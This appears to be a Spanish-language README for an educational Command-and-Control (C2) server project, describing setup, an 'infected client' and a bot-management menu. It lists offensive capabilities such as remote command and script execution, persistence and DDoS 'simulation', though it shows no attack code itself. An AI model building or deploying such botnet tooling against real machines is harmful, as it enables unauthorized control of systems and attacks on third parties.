# 🕵️‍♂️ C2 Server

Este es un servidor de Comando y Control (C2) desarrollado para fines educativos y de investigación en entornos controlados. Permite la gestión de bots conectados y el envío de órdenes desde una consola central.

## 🚀 Características

- 📡 Acepta múltiples conexiones de bots.
- 🔄 Manejo de órdenes en tiempo real.
- 🛠 Interfaz en línea de comandos para administrar bots.
- 🔍 Monitoreo de actividad y mensajes enviados.
- ⚙️ Identificación del sistema operativo de los bots (Windows o Linux).
- 🛡️ Mejor control de errores y estabilidad en el manejo de conexiones.
- 🔐 Mejoras en la selección y envío de comandos a los bots.
- 🛠 Simulación de ataques DDoS de manera controlada.
- 🛑 Capacidad para detener simulaciones de DDoS.

## 🔧 Instalación

1. Clona el repositorio:
    ```bash
    git clone https://github.com/cybermemillo/c2memo.git
    cd c2memo
    ```

2. Instala las dependencias necesarias:
    ```bash
    pip install -r requirements.txt
    ```

3. Configura el archivo `config.ini` en la carpeta `config` según tus necesidades.

4. Inicia el servidor:
    ```bash
    python3 src/servidor.py
    ```

5. Inicia el cliente infectado en las máquinas que desees conectar al servidor:
    ```bash
    python3 src/clienteinfectado.py --host <IP_DEL_SERVIDOR> --port <PUERTO> --key <CLAVE>
    ```

## 📌 Novedades en esta versión (v1.1)

- 🌍 **Detección del sistema operativo de cada bot** para adaptar los comandos enviados según sea Windows o Linux.
- 🛠 **Manejo seguro de desconexiones** para evitar errores al eliminar bots inactivos.
- ✅ **Validación de selección de bots** para prevenir fallos en la conversión de IDs.
- ⚖️ **Mejor gestión de errores** en la conexión y ejecución de comandos.
- 🖥️ **Interfaz más estructurada** en la consola, con opciones mejor organizadas.
- 🤖 **Mejoras en el cliente infectado**:
  - Implementación de detección del sistema operativo.
  - Introducción de la función `ejecutar_comando()` para mejorar la ejecución de órdenes.
  - Manejo de errores en la recepción y ejecución de comandos.
  - Optimización del código y eliminación de redundancias.
  - Documentación mejorada con docstrings detallados.

## 📚 Uso del Proyecto

### Menú Principal del Servidor

1. **Listar bots conectados**: Muestra una lista de todos los bots actualmente conectados al servidor.
2. **Enviar comandos**: Permite enviar comandos a los bots conectados.
3. **Cerrar conexión con un bot**: Cierra la conexión con un bot específico.
4. **Salir**: Detiene el servidor y cierra todas las conexiones.

### Comandos Disponibles

#### Comandos Básicos

1. **Obtener información del sistema**: Muestra información del sistema operativo del bot.
2. **Consultar conexiones de red**: Muestra las conexiones de red activas en el bot.
3. **Ver procesos en ejecución**: Lista los procesos en ejecución en el bot.
4. **Listar archivos en el directorio actual**: Muestra los archivos en el directorio actual del bot.
5. **Obtener la IP pública**: Muestra la IP pública del bot.

#### Comandos Avanzados

1. **Simular ataque DDoS**: Inicia una simulación de ataque DDoS en el bot.
2. **Detener simulación de DDoS**: Detiene la simulación de ataque DDoS en el bot.
3. **Ejecutar un comando personalizado**: Permite enviar un comando personalizado al bot.
4. **Ejecutar un script remoto**: Permite enviar y ejecutar un script remoto en el bot.
5. **Intentar asegurar la persistencia**: Intenta establecer persistencia en el bot.

## 📦 Dependencias

- Python 3.x
- requests
- sqlite3
- configparser
- logging

## 📂 Estructura del Proyecto

```plaintext
C-CMemo/
├── config/                # Configuración del proyecto
│   └── config.ini
├── docs/                  # Documentación
│   ├── LICENSE.md
│   └── README.md
├── logs/                  # Aquí se guardarán los logs
│   └── client.log
├── src/                   # Código fuente
│   ├── bbdd/              # Base de datos
│   │   └── bots.bd
│   ├── clienteinfectado.py
│   └── servidor.py
└── requirements.txt       # Dependencias del proyecto
```

## ⚠️ Nota Importante

Este proyecto está diseñado únicamente para uso en entornos de prueba y con propósitos educativos. No se debe utilizar para actividades no autorizadas.
